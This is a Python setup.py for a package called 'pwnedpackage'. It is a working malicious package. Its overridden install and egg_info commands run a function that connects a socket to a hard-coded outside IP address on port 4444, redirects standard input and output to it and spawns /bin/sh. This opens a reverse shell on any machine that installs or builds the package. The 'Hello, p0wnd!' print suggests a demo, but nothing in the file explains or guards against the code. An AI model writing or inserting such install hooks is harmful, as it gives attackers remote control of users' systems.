from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import socket
import os
import pty

def RunCommand():
    print("Hello, p0wnd!")
    
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("3.22.201.79",4444))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        pty.spawn("/bin/sh")
    except:
        print("no shell :(")

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)

class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name="pwnedpackage",
    version="0.0.1",
    license="MIT",
    packages=find_packages(),
    cmdclass={
        'install': RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
